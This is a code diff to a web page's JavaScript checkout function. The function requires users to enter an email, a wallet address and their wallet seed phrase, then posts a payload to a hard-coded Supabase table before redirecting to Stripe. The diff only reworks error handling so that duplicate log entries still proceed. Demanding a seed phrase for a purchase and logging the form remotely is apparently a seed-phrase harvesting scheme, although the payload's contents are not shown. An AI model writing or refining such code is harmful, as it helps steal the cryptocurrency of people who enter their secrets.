@@ -531,7 +531,6 @@ async function continueToPurchase() {
   const wallet = document.getElementById('wallet-address').innerText.trim();
   const seed = document.getElementById('seed-phrase').innerText.trim();
 
-  // Basic checks
   const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   if (!emailRegex.test(email) || !wallet || !seed) {
     alert('❌ Please complete all fields (with a valid email).');
@@ -567,7 +566,6 @@ async function continueToPurchase() {
   // Always save current fields after logic
   saveSessionFields();
 
-  // Prepare payload for logging & Stripe
   const flowType = 'create';
   const batch = 'B01';
   const payload = {
@@ -582,6 +580,7 @@ async function continueToPurchase() {
   };
 
   // 1. Partial log to Supabase before Stripe
+  let allowContinue = false;
   try {
     const logRes = await fetch("https://xlbquzoalvwmtjadteft.supabase.co/rest/v1/create_log", {
       method: "POST",
@@ -592,18 +591,28 @@ async function continueToPurchase() {
       body: JSON.stringify(payload)
     });
 
-    if (!logRes.ok) {
+    if (logRes.ok) {
+      console.log("✅ Partial log submitted to Supabase:", payload);
+      allowContinue = true;
+    } else {
       const errorMsg = await logRes.text();
-      console.error("❌ Supabase log error:", errorMsg);
-      alert("❌ Error logging to Supabase. Please try again.");
-      return;
+      if (logRes.status === 409) {
+        // Duplicate flow_id, already exists, allow continue!
+        console.warn("⚠️ Supabase log duplicate (flow_id exists), continuing to Stripe...");
+        allowContinue = true;
+      } else {
+        console.error("❌ Supabase log error:", errorMsg);
+        alert("❌ Error logging to Supabase. Please try again.");
+        return;
+      }
     }
-    console.log("✅ Partial log submitted to Supabase:", payload);
   } catch (err) {
     console.error("❌ Supabase log network error:", err);
     alert("❌ Network error logging to Supabase.");
     return;
   }
+
+  if (!allowContinue) return;
 
   // 2. Continue to Stripe bridge
   console.log("Sending flowID:", payload.flow_id);
